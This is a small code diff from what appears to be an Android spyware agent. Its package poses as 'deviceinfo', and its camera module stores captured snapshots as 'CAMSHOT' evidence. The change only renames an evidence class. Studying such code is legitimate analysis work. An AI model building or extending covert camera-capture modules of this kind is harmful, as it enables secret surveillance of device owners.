@@ -18,7 +18,7 @@ import android.os.Build;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.ConfModule;
-import com.android.deviceinfo.evidence.EvidenceReference;
+import com.android.deviceinfo.evidence.EvidenceBuilder;
 import com.android.deviceinfo.evidence.EvidenceType;
 import com.android.deviceinfo.gui.CGui;
 import com.android.deviceinfo.util.Check;
@@ -139,7 +139,7 @@ public class ModuleCamera extends BaseInstantModule {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (callback), bs: " + bs.length);
 		}
-		EvidenceReference.atomic(EvidenceType.CAMSHOT, null, bs);
+		EvidenceBuilder.atomic(EvidenceType.CAMSHOT, null, bs);
 	}
 
 }
